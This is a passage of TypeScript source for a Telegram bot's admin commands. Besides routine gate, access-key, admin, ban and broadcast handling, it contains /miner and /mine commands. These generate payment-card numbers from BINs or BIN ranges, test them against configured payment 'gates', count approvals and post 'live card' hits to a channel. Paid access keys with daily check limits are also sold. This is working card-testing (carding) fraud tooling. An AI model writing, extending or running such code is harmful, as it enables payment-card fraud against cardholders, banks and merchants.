      const hit = gates.find(g => g.id === target)
                || gates.find(g => g.id.startsWith(target))
                || gates.find(g => g.name.toLowerCase() === target.toLowerCase())
                || gates.find(g => g.name.toLowerCase().includes(target.toLowerCase()));
      if (!hit) {
        bot?.sendMessage(chatId, `❌ No gate matches \`${target}\`. Use /gates to list.`, { parse_mode: "Markdown" });
        return;
      }
      try {
        await storage.deleteGateConfig(hit.id);
        await storage.createSystemLog({ level: "INFO", message: `Gate "${hit.name}" deleted via Telegram`, source: "telegram" });
        bot?.sendMessage(chatId, `🗑 Deleted *${hit.name}* (${hit.gateType})`, { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Delete failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /wipegates — delete ALL gates with confirmation button (admin) ──────
    bot.onText(/^\/wipegates(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const gates = await storage.getGateConfigs();
      if (gates.length === 0) { bot?.sendMessage(chatId, "_No gates to wipe._", { parse_mode: "Markdown" }); return; }
      bot?.sendMessage(chatId,
`⚠️ *Wipe All Gates*
This deletes *${gates.length}* gates. Cannot be undone (use /exportgates first to back up).`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [
          [{ text: "🗑 Yes, delete all", callback_data: "wipegates_confirm" }, { text: "✖️ Cancel", callback_data: "wipegates_cancel" }],
        ]}});
    });

    // ─── /genkey [days] [dailyLimit] — generate an access key (admin) ────────
    // Default: 30 days, 1000 daily checks. Examples:
    //   /genkey            → 30-day, 1000/day
    //   /genkey 7          → 7-day, 1000/day
    //   /genkey 90 5000    → 90-day, 5000/day
    //   /genkey unlimited  → no expiry (durationDays=0)
    bot.onText(/^\/genkey(?:@\w+)?(?:\s+(\S+)(?:\s+(\d+))?)?\s*$/i, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const durRaw = match?.[1]?.toLowerCase();
      const dailyRaw = match?.[2];
      let durationDays = 30;
      if (durRaw) {
        if (durRaw === "unlimited" || durRaw === "never" || durRaw === "0") durationDays = 0;
        else {
          const n = parseInt(durRaw, 10);
          if (Number.isNaN(n) || n < 0 || n > 3650) {
            bot?.sendMessage(chatId, "❌ Duration must be a positive integer ≤ 3650 days, or `unlimited`."); return;
          }
          durationDays = n;
        }
      }
      const dailyLimit = dailyRaw ? Math.min(Math.max(parseInt(dailyRaw, 10), 1), 1_000_000) : 1000;

      // Generate H0-XXXX-XXXX-XXXX (12 hex chars, dash-separated, unambiguous)
      // Random bytes give us cryptographic uniqueness; the unique constraint
      // on key column would catch any astronomical collision at insert time.
      const { randomBytes } = await import("crypto");
      const segments = Array.from({ length: 3 }, () =>
        randomBytes(2).toString("hex").toUpperCase()
      );
      const key = `H0-${segments.join("-")}`;
      const expiresAt = durationDays > 0 ? new Date(Date.now() + durationDays * 86400_000) : null;

      try {
        const created = await storage.createAccessKey({
          key, durationDays, dailyLimit,
          status: "unused", expiresAt: expiresAt as any,
        } as any);
        await storage.createSystemLog({ level: "INFO", message: `Access key generated via Telegram: ${key} (${durationDays}d, ${dailyLimit}/day)`, source: "telegram" });
        const expiryLine = durationDays > 0
          ? `*Expires:* ${expiresAt!.toISOString().slice(0, 10)} (in ${durationDays}d)`
          : `*Expires:* never`;
        bot?.sendMessage(chatId,
`🔑 *Access Key Created*
━━━━━━━━━━━━━━━━━━━━
\`${key}\`
${expiryLine}
*Daily limit:* ${dailyLimit.toLocaleString()}/day
*Status:* ${created.status}

Forward this key to a user — they redeem with:
\`/redeem ${key}\``,
          { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Create failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /keys — list all access keys with status (admin) ────────────────────
    bot.onText(/^\/keys(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const keys = await storage.getAccessKeys();
      if (keys.length === 0) {
        bot?.sendMessage(chatId, "_No access keys yet. Use_ `/genkey` _to create one._", { parse_mode: "Markdown" });
        return;
      }
      const now = new Date();
      const fmt = (k: any) => {
        const exp = k.expiresAt ? new Date(k.expiresAt) : null;
        const expired = exp && exp < now;
        const icon = k.status === "redeemed" ? (expired ? "⏰" : "✅") : (expired ? "❌" : "🆕");
        const expLine = exp ? exp.toISOString().slice(0, 10) : "never";
        const byLine = k.redeemedBy ? ` by \`${k.redeemedBy}\`` : "";
        return `${icon} \`${k.key}\` · ${k.dailyLimit}/d · exp \`${expLine}\`${byLine}`;
      };
      const header = `🔑 *Access Keys* (${keys.length})\n━━━━━━━━━━━━━━━━━━━━\n🆕 unused · ✅ active · ⏰ redeemed-expired · ❌ unused-expired\n\n`;
      const lines = keys.map(fmt);
      const MAX = 3900;
      const chunks: string[] = [];
      let cur = header;
      for (const line of lines) {
        if ((cur + line + "\n").length > MAX) { chunks.push(cur); cur = ""; }
        cur += line + "\n";
      }
      if (cur.trim()) chunks.push(cur);
      for (const c of chunks) {
        await bot?.sendMessage(chatId, c, { parse_mode: "Markdown" }).catch(() => {
          bot?.sendMessage(chatId, c.replace(/[*_`\[\]]/g, ""));
        });
      }
    });

    // ─── /revokekey KEY_OR_PREFIX — delete a single access key (admin) ───────
    bot.onText(/^\/revokekey(?:@\w+)?(?:\s+(\S+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const target = (match?.[1] || "").trim();
      if (!target) {
        bot?.sendMessage(chatId, "❌ Usage: `/revokekey <key|prefix|id>`", { parse_mode: "Markdown" });
        return;
      }
      const keys = await storage.getAccessKeys();
      const hit = keys.find(k => k.key === target)
                || keys.find(k => k.id === target)
                || keys.find(k => k.key.startsWith(target.toUpperCase()))
                || keys.find(k => k.id.startsWith(target));
      if (!hit) {
        bot?.sendMessage(chatId, `❌ No key matches \`${target}\`. Use /keys to list.`, { parse_mode: "Markdown" });
        return;
      }
      try {
        await storage.deleteAccessKey(hit.id);
        await storage.createSystemLog({ level: "INFO", message: `Access key revoked via Telegram: ${hit.key}`, source: "telegram" });
        bot?.sendMessage(chatId, `🗑 Revoked \`${hit.key}\``, { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Revoke failed: ${e?.message?.slice(0, 120) || "unknown error"}`);
      }
    });

    // ─── /clearkeys — wipe all access keys with confirmation (admin) ─────────
    bot.onText(/^\/clearkeys(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only."); return;
      }
      const keys = await storage.getAccessKeys();
      if (keys.length === 0) { bot?.sendMessage(chatId, "_No keys to clear._", { parse_mode: "Markdown" }); return; }
      bot?.sendMessage(chatId,
`⚠️ *Clear All Access Keys*
This deletes *${keys.length}* keys (including active redeemed ones — their users lose access). Cannot be undone.`,
        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [
          [{ text: "🗑 Yes, clear all", callback_data: "clearkeys_confirm" }, { text: "✖️ Cancel", callback_data: "clearkeys_cancel" }],
        ]}});
    });

    // ── /features — owner-only on/off switch board ────────────────────────────
    //   /features                  → list every feature with its current state
    //   /features <key> on|off     → flip one
    //   /features reset            → re-enable everything
    bot.onText(/\/features(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkOwner(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Owner only.");
        return;
      }
      const args = (match?.[1] || "").trim().split(/\s+/);
      if (args[0] === "reset") {
        const { resetAllFeatures } = await import("./feature-toggles");
        resetAllFeatures();
        bot?.sendMessage(chatId, "✅ All features reset to ON.");
        return;
      }
      if (args[0] && (args[1] === "on" || args[1] === "off")) {
        const key = args[0] as FeatureKey;
        if (!FEATURE_KEYS.includes(key)) {
          bot?.sendMessage(chatId, `❌ Unknown feature \`${key}\`. Use /features to list valid keys.`, { parse_mode: "Markdown" });
          return;
        }
        setFeatureEnabled(key, args[1] === "on");
        bot?.sendMessage(chatId, `✅ \`${key}\` → *${args[1].toUpperCase()}*`, { parse_mode: "Markdown" });
        // Push the updated visible-command list to Telegram so the "/"
        // autocomplete menu drops disabled commands immediately (and
        // re-adds them when toggled back on). Best-effort — failure
        // doesn't affect the toggle itself.
        syncBotCommandsMenu().catch(() => {});
        return;
      }
      const states = getAllFeatureStates();
      const lines = states.map(s => `${s.enabled ? "🟢" : "🔴"} \`${s.key}\``).join("\n");
      bot?.sendMessage(chatId,
`🎛 *Feature Toggles*
━━━━━━━━━━━━━━━━━━━━
${lines}

Flip: \`/features <key> on|off\`
Reset: \`/features reset\``,
        { parse_mode: "Markdown" });
    });

    // ── Admin management (owner-only) ─────────────────────────────────────────
    //  /addadmin <telegram_id> [username]   promote a user to admin
    //  /removeadmin <telegram_id>           demote back to regular user
    //  /admins                              list current admins + the owner
    bot.onText(/\/addadmin(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkOwner(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Owner only. (Only the bot owner can add admins.)");
        return;
      }
      const args = (match?.[1] || "").trim().split(/\s+/);
      const targetId = args[0];
      const optionalUsername = args.slice(1).join(" ") || undefined;
      if (!targetId || !/^\d+$/.test(targetId)) {
        bot?.sendMessage(chatId,
`👑 *Add Admin* — usage
━━━━━━━━━━━━━━━━━━━━
\`/addadmin <telegram_id> [username]\`

The user's numeric telegram ID (not @username). They can find theirs by sending /myinfo first.`,
          { parse_mode: "Markdown" });
        return;
      }
      try {
        const existing = await storage.getBotUser(targetId);
        if (existing) {
          if (existing.role === "owner") {
            bot?.sendMessage(chatId, `👑 ${targetId} is the owner — already has full access.`);
            return;
          }
          if (existing.role === "admin") {
            bot?.sendMessage(chatId, `✅ ${targetId} (@${existing.username || "?"}) is already an admin.`);
            return;
          }
          await storage.updateBotUser(existing.id, { role: "admin", banned: false } as any);
        } else {
          await storage.createBotUser({
            telegramId: targetId,
            username: optionalUsername || `user_${targetId}`,
            role: "admin",
          } as any);
        }
        await storage.createSystemLog({ level: "INFO", source: "telegram-admin", message: `${telegramId} promoted ${targetId} to admin` } as any).catch(() => {});
        bot?.sendMessage(chatId,
`✅ *Admin Added*
━━━━━━━━━━━━━━━━━━━━
ID: \`${targetId}\`${optionalUsername ? `\nUsername: ${tgEscape(optionalUsername)}` : ""}
They now have full bot access — no \`/login\` required.`,
          { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Failed: ${e.message}`);
      }
    });

    bot.onText(/\/removeadmin(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkOwner(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Owner only.");
        return;
      }
      const targetId = (match?.[1] || "").trim().split(/\s+/)[0];
      if (!targetId || !/^\d+$/.test(targetId)) {
        bot?.sendMessage(chatId, "Usage: `/removeadmin <telegram_id>`", { parse_mode: "Markdown" });
        return;
      }
      try {
        const existing = await storage.getBotUser(targetId);
        if (!existing) {
          bot?.sendMessage(chatId, `❌ ${targetId} is not a known user.`);
          return;
        }
        if (existing.role === "owner") {
          bot?.sendMessage(chatId, `🚫 Can't demote the owner.`);
          return;
        }
        if (existing.role !== "admin") {
          bot?.sendMessage(chatId, `ℹ️ ${targetId} is not an admin (role: ${existing.role}).`);
          return;
        }
        await storage.updateBotUser(existing.id, { role: "user" } as any);
        adminSessions.delete(targetId); // also kill any /login session they have
        await storage.createSystemLog({ level: "INFO", source: "telegram-admin", message: `${telegramId} demoted ${targetId} from admin` } as any).catch(() => {});
        bot?.sendMessage(chatId, `✅ \`${targetId}\` (@${tgEscape(existing.username || "?")}) demoted to regular user.`, { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Failed: ${e.message}`);
      }
    });

    bot.onText(/\/admins$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only.");
        return;
      }
      try {
        const allUsers = await storage.getBotUsers();
        const owners = (allUsers as any[]).filter(u => u.role === "owner");
        const admins = (allUsers as any[]).filter(u => u.role === "admin");
        const sysSettings = await storage.getBotSettings();
        const ownerIdFromSettings = sysSettings.ownerId;

        // Usernames from the DB may contain underscores/asterisks that break
        // Markdown parsing — escape them defensively.
        const fmt = (u: any) => `• \`${u.telegramId}\` — @${tgEscape(u.username || "?")}${u.banned ? " 🚫" : ""}`;
        const ownerLines = owners.map(fmt).join("\n") || (ownerIdFromSettings ? `• \`${ownerIdFromSettings}\` — (from bot settings)` : "(none)");
        const adminLines = admins.map(fmt).join("\n") || "(none)";

        bot?.sendMessage(chatId,
`👑 *Admin Roster*
━━━━━━━━━━━━━━━━━━━━
*Owner${owners.length > 1 ? "s" : ""}* (${owners.length})
${ownerLines}

*Admins* (${admins.length})
${adminLines}

Add: \`/addadmin <telegram_id>\` (owner-only)
Remove: \`/removeadmin <telegram_id>\` (owner-only)`,
          { parse_mode: "Markdown" });
      } catch (e: any) {
        bot?.sendMessage(chatId, `❌ Failed: ${e.message}`);
      }
    });

    bot.onText(/^\/ban(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const targetId = match?.[1]?.trim() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      if (!targetId) {
        bot?.sendMessage(chatId, "🚫 *Usage:* `/ban <telegram_id>`\n\nGet the user's numeric Telegram ID via /myinfo or @userinfobot.", { parse_mode: "Markdown" });
        return;
      }

      const target = await storage.getBotUser(targetId);
      if (!target) {
        bot?.sendMessage(chatId, `❌ No user with telegramId \`${targetId}\`. They need to /start the bot at least once first.`, { parse_mode: "Markdown" });
        return;
      }

      await storage.updateBotUser(target.id, { banned: true });
      bot?.sendMessage(chatId, `🚫 *${tgEscape(target.username || targetId)}* banned.`, { parse_mode: "Markdown" });
    });

    bot.onText(/^\/unban(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const targetId = match?.[1]?.trim() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      if (!targetId) {
        bot?.sendMessage(chatId, "✅ *Usage:* `/unban <telegram_id>`", { parse_mode: "Markdown" });
        return;
      }

      const target = await storage.getBotUser(targetId);
      if (!target) {
        bot?.sendMessage(chatId, `❌ No user with telegramId \`${targetId}\`.`, { parse_mode: "Markdown" });
        return;
      }

      await storage.updateBotUser(target.id, { banned: false });
      bot?.sendMessage(chatId, `✅ *${tgEscape(target.username || targetId)}* unbanned.`, { parse_mode: "Markdown" });
    });

    bot.onText(/^\/broadcast(?:@\w+)?(?:\s+([\s\S]+))?$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const message = match?.[1]?.trim() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      if (!message) {
        bot?.sendMessage(chatId, "📢 *Usage:* `/broadcast <message>`\n\nSends the message as a DM to every active (non-banned) bot user.", { parse_mode: "Markdown" });
        return;
      }

      const allUsers = await storage.getBotUsers();
      let sent = 0;
      for (const user of allUsers) {
        if (!user.banned && user.telegramId) {
          try {
            await bot?.sendMessage(user.telegramId, `📢 *Broadcast*\n━━━━━━━━━━━━━━━━━━━━\n${message}\n━━━━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" });
            sent++;
          } catch {}
        }
      }

      bot?.sendMessage(chatId, `✅ Broadcast sent to *${sent}* users.`, { parse_mode: "Markdown" });
    });

    // ─── /testchannel — verify live-card broadcast wiring (admin) ─────────────
    // Fix 3: Until now there was no way for an admin to verify the channel
    // chatId works without actually getting a live card hit. This posts a
    // diagnostic message to the configured channel and reports back exactly
    // what happened: ✅ sent, or the specific Telegram error (bot not in
    // channel, wrong id, missing permission, etc.).
    bot.onText(/^\/testchannel(?:@\w+)?\s*$/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }
      const settings = await storage.getBotSettings();
      if (!settings.chatId) {
        bot?.sendMessage(chatId,
          "❌ *No channel chatId configured.*\n\n" +
          "Set one via dashboard → Bot Settings, or POST /api/bot-settings.\n" +
          "For Telegram channels the id starts with `-100…`. Make sure the bot is added to the channel as admin with post-message permission.",
          { parse_mode: "Markdown" });
        return;
      }
      const isPostingOn = settings.sendLiveToChannel !== false && isFeatureEnabled("channel_post");
      const stamp = new Date().toISOString().replace("T", " ").slice(0, 19);
      const testMsg = `🧪 *Channel Test*\n━━━━━━━━━━━━━━━━━━━━\nThis is a wiring diagnostic from /testchannel.\n*By:* \`${telegramId}\`\n*When:* ${stamp}\n*Feature:* channel_post=${isFeatureEnabled("channel_post") ? "ON" : "OFF"} · sendLiveToChannel=${settings.sendLiveToChannel === false ? "OFF" : "ON"}\n━━━━━━━━━━━━━━━━━━━━\nIf you see this in the channel, broadcast is wired up correctly.`;
      try {
        await bot?.sendMessage(settings.chatId, testMsg, { parse_mode: "Markdown" });
        bot?.sendMessage(chatId,
          `✅ *Test posted.* Check the channel.\n\n` +
          `*chatId:* \`${settings.chatId}\`\n` +
          `*Posting enabled:* ${isPostingOn ? "yes" : "no — broadcasts will still be skipped"}\n\n` +
          (isPostingOn ? "" : "_Re-enable with `/features channel_post on` and ensure sendLiveToChannel is true in Bot Settings._"),
          { parse_mode: "Markdown" });
      } catch (e: any) {
        const reason = e?.message || String(e);
        // Common Telegram errors → actionable hints. Each line maps a real
        // error string to what the operator needs to do.
        let hint = "";
        if (/chat not found/i.test(reason))         hint = "The chatId is wrong, OR the bot was never added to the channel. Get the channel id from a forwarded message or @userinfobot.";
        else if (/bot was kicked/i.test(reason))     hint = "Re-add the bot to the channel as admin.";
        else if (/not enough rights/i.test(reason)) hint = "Bot is in the channel but doesn't have post-message permission. Channel → Administrators → bot → enable Post Messages.";
        else if (/bot is not a member/i.test(reason)) hint = "Add the bot to the channel first, then grant admin + Post Messages.";
        else if (/Bad Request: have no rights/i.test(reason)) hint = "Permission missing. Channel → Administrators → bot → check post permissions.";
        bot?.sendMessage(chatId,
          `❌ *Channel post failed.*\n\n` +
          `*Telegram said:* \`${reason.slice(0, 200)}\`\n` +
          `*chatId tried:* \`${settings.chatId}\`\n\n` +
          (hint ? `*Fix:* ${hint}` : "Check that the bot is added to the channel as admin with post-message permission."),
          { parse_mode: "Markdown" });
      }
    });

    // ─── /miner — Server miner control (admin) ────────────────────────────────
    bot.onText(/^\/miner(?:@\w+)?(?:\s+(.+))?\s*$/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("miner")) { bot?.sendMessage(chatId, "🚫 Miner is disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const args   = (match?.[1]?.trim() || "").split(/\s+/);
      const action = args[0]?.toLowerCase() || "";

      const formatMinerStatus = async () => {
        const cfg = await storage.getMinerConfig();
        const running = isMinerRunning();
        const bins = (cfg.binList as string[]) || [];
        const allGates = await storage.getGateConfigs();
        const gate = cfg.gateId ? allGates.find(g => g.id === cfg.gateId) : null;
        const rate = cfg.totalTried > 0
          ? ((cfg.totalApproved / cfg.totalTried) * 100).toFixed(2)
          : "0.00";
        return `⛏️ *CC MINER*
━━━━━━━━━━━━━━━━━━━━
Status: ${running ? "🟢 *RUNNING*" : "🔴 STOPPED"}
Gate: ${gate ? gate.name : "Not set"}
BINs: ${bins.length > 0 ? bins.join(", ") : "None"}
Current: ${cfg.currentBin || "—"}
Delay: ${cfg.delaySecs}s | Max/BIN: ${cfg.maxCardsPerBin}
Notify: ${cfg.notifyEnabled ? "ON 🔔" : "OFF 🔕"}
━━━━━━━━━━━━━━━━━━━━
Tried: *${cfg.totalTried}* | ✅ *${cfg.totalApproved}* | Rate: ${rate}%
━━━━━━━━━━━━━━━━━━━━
/miner start|stop|gate|add|remove|noti|delay`;
      };

      // /miner (no args) or /miner status
      if (!action || action === "status") {
        bot?.sendMessage(chatId, await formatMinerStatus(), { parse_mode: "Markdown" });
        return;
      }

      // /miner start
      if (action === "start") {
        const result = await startMiner((card, hitResult, gateName, gateId) => {
          notifyLiveCardToChannel(card, hitResult, gateName, "server-miner", gateId);
        });
        if (!result.ok) {
          const msgs: Record<string, string> = {
            already_running: "⚠️ Miner is already running.",
            no_gate:         "❌ No gate selected. Use `/miner gate GATE_ID`.",
            no_bins:         "❌ No BINs configured. Use `/miner add BIN`.",
            gate_not_found:  "❌ Configured gate no longer exists.",
            gate_inactive:   "❌ Configured gate is inactive.",
          };
          bot?.sendMessage(chatId, msgs[result.reason ?? ""] ?? `❌ Cannot start: ${result.reason}`, { parse_mode: "Markdown" });
        } else {
          bot?.sendMessage(chatId, await formatMinerStatus(), { parse_mode: "Markdown" });
        }
        return;
      }

      // /miner stop
      if (action === "stop") {
        await stopMiner();
        bot?.sendMessage(chatId, "🛑 *Miner stopped.*", { parse_mode: "Markdown" });
        return;
      }

      // /miner gate ID — set gate
      if (action === "gate") {
        if (args.length < 2) {
          const allGates = await storage.getGateConfigs();
          const active = allGates.filter(g => g.active);
          const list = active.slice(0, 10).map(g => `\`${g.id.substring(0, 8)}\` — ${g.name}`).join("\n");
          bot?.sendMessage(chatId,
`⛏️ *Active Gates*
━━━━━━━━━━━━━━━━━━━━
${list || "No active gates"}
━━━━━━━━━━━━━━━━━━━━
\`/miner gate GATE_ID\` — select`, { parse_mode: "Markdown" });
          return;
        }
        const gateId = args[1];
        const allGates = await storage.getGateConfigs();
        const gate = allGates.find(g => g.id === gateId || g.id.startsWith(gateId));
        if (!gate) {
          bot?.sendMessage(chatId, `❌ Gate not found: \`${gateId.substring(0, 20)}\`\nUse \`/miner gate\` to list active gates.`, { parse_mode: "Markdown" });
          return;
        }
        await storage.updateMinerConfig({ gateId: gate.id });
        bot?.sendMessage(chatId, `✅ Gate set to *${gate.name}*`, { parse_mode: "Markdown" });
        return;
      }

      // /miner gates — list available gates
      if (action === "gates") {
        const allGates = await storage.getGateConfigs();
        const active = allGates.filter(g => g.active);
        const list = active.slice(0, 10).map(g => `\`${g.id.substring(0, 8)}\` — ${g.name} (${g.gateType})`).join("\n");
        bot?.sendMessage(chatId,
`⛏️ *Active Gates*
━━━━━━━━━━━━━━━━━━━━
${list || "No active gates"}
━━━━━━━━━━━━━━━━━━━━
\`/miner gate GATE_ID\` — select`, { parse_mode: "Markdown" });
        return;
      }

      // /miner bins — list BINs
      if (action === "bins") {
        const cfg = await storage.getMinerConfig();
        const bins = (cfg.binList as string[]) || [];
        bot?.sendMessage(chatId,
`⛏️ *BIN List* (${bins.length})
━━━━━━━━━━━━━━━━━━━━
${bins.length > 0 ? bins.map((b, i) => `${i + 1}. \`${b}\``).join("\n") : "No BINs configured"}
━━━━━━━━━━━━━━━━━━━━
\`/miner add BIN\` — add
\`/miner remove BIN\` — remove`, { parse_mode: "Markdown" });
        return;
      }

      // /miner add BIN
      if (action === "add") {
        const bin = (args[1] || "").replace(/\D/g, "");
        if (bin.length < 6) {
          bot?.sendMessage(chatId, "❌ BIN must be at least 6 digits.");
          return;
        }
        const cfg = await storage.getMinerConfig();
        const list = (cfg.binList as string[]) || [];
        if (list.includes(bin)) {
          bot?.sendMessage(chatId, `⚠️ BIN \`${bin}\` is already in the list.`, { parse_mode: "Markdown" });
          return;
        }
        list.push(bin);
        await storage.updateMinerConfig({ binList: list as any });
        bot?.sendMessage(chatId, `✅ BIN \`${bin}\` added. Total: ${list.length} BINs.`, { parse_mode: "Markdown" });
        return;
      }

      // /miner remove BIN
      if (action === "remove") {
        const bin = (args[1] || "").replace(/\D/g, "");
        const cfg = await storage.getMinerConfig();
        const list = ((cfg.binList as string[]) || []).filter(b => b !== bin);
        await storage.updateMinerConfig({ binList: list as any });
        bot?.sendMessage(chatId, `✅ BIN \`${bin}\` removed. Remaining: ${list.length}.`, { parse_mode: "Markdown" });
        return;
      }

      // /miner noti on|off
      if (action === "noti") {
        const state = args[1]?.toLowerCase();
        if (state !== "on" && state !== "off") {
          bot?.sendMessage(chatId, "Usage: `/miner noti on|off`", { parse_mode: "Markdown" });
          return;
        }
        const enabled = state === "on";
        await storage.updateMinerConfig({ notifyEnabled: enabled });
        bot?.sendMessage(chatId, `🔔 Miner notifications: *${enabled ? "ON" : "OFF"}*`, { parse_mode: "Markdown" });
        return;
      }

      // /miner delay N
      if (action === "delay") {
        const secs = parseInt(args[1] || "3", 10);
        if (isNaN(secs) || secs < 1 || secs > 60) {
          bot?.sendMessage(chatId, "❌ Delay must be 1–60 seconds.");
          return;
        }
        await storage.updateMinerConfig({ delaySecs: secs });
        bot?.sendMessage(chatId, `✅ Miner delay set to *${secs}s* between cards.`, { parse_mode: "Markdown" });
        return;
      }

      // /miner maxbin N
      if (action === "maxbin") {
        const n = parseInt(args[1] || "50", 10);
        if (isNaN(n) || n < 1 || n > 500) {
          bot?.sendMessage(chatId, "❌ Max cards per BIN must be 1–500.");
          return;
        }
        await storage.updateMinerConfig({ maxCardsPerBin: n });
        bot?.sendMessage(chatId, `✅ Max cards per BIN set to *${n}*.`, { parse_mode: "Markdown" });
        return;
      }

      // Help
      bot?.sendMessage(chatId,
`⛏️ *Miner Commands*
━━━━━━━━━━━━━━━━━━━━
/miner — Status
/miner start — Start server miner
/miner stop — Stop server miner
/miner gate ID — Select gate
/miner gates — List gates
/miner bins — Show BIN list
/miner add BIN — Add BIN
/miner remove BIN — Remove BIN
/miner noti on|off — Notifications
/miner delay N — Set delay (1–60s)
/miner maxbin N — Max cards per BIN`, { parse_mode: "Markdown" });
    });

    // ─── /mine — Range-based CC miner (admin) ──────────────────────────────
    const MINE_STATE_FILE = path.join(process.cwd(), "data", ".mine-config.json");

    interface MineState {
      startBin: string;
      endBin: string;
      extraBins: string[];
      month: string;
      year: string;
      typeFilter: "all" | "credit" | "prepaid" | "debit";
      gateId: string;
      delaySecs: number;
      maxCardsPerBin: number;
      notifyEnabled: boolean;
      totalTried: number;
      totalApproved: number;
      isRunning: boolean;
    }

    const DEFAULT_MINE: MineState = {
      startBin: "", endBin: "", extraBins: [],
      month: "random", year: "random", typeFilter: "all",
      gateId: "random", delaySecs: 3, maxCardsPerBin: 50,
      notifyEnabled: true, totalTried: 0, totalApproved: 0, isRunning: false,
    };

    function loadMineConfig(): MineState {
      try {
        if (fs.existsSync(MINE_STATE_FILE)) {
          return { ...DEFAULT_MINE, ...JSON.parse(fs.readFileSync(MINE_STATE_FILE, "utf8")) };
        }
      } catch { /* fall through */ }
      return { ...DEFAULT_MINE };
    }

    function saveMineConfig(cfg: MineState): void {
      try {
        const dir = path.dirname(MINE_STATE_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(MINE_STATE_FILE, JSON.stringify(cfg, null, 2), { mode: 0o600 });
      } catch (e: any) {
        console.error(`[mine] failed to save config: ${e?.message ?? e}`);
      }
    }

    function formatMineStatus(cfg: MineState): string {
      const running = isRangeMinerRunning();
      const gateLabel = cfg.gateId === "random" ? "Random" : (cfg.gateId || "Not set");
      const range = cfg.startBin && cfg.endBin ? `${cfg.startBin}→${cfg.endBin}` : "Not set";
      const rate = cfg.totalTried > 0 ? ((cfg.totalApproved / cfg.totalTried) * 100).toFixed(2) : "0.00";
      return `⛏️ *RANGE MINER*
━━━━━━━━━━━━━━━━━━━━
Status: ${running ? "🟢 *RUNNING*" : "🔴 STOPPED"}
Range: \`${range}\` | Extra BINs: ${cfg.extraBins.length}
Month: \`${cfg.month}\` | Year: \`${cfg.year}\`
Type: *${cfg.typeFilter.toUpperCase()}*
Gate: ${gateLabel}
Delay: ${cfg.delaySecs}s | Max/BIN: ${cfg.maxCardsPerBin}
Notify: ${cfg.notifyEnabled ? "ON" : "OFF"}
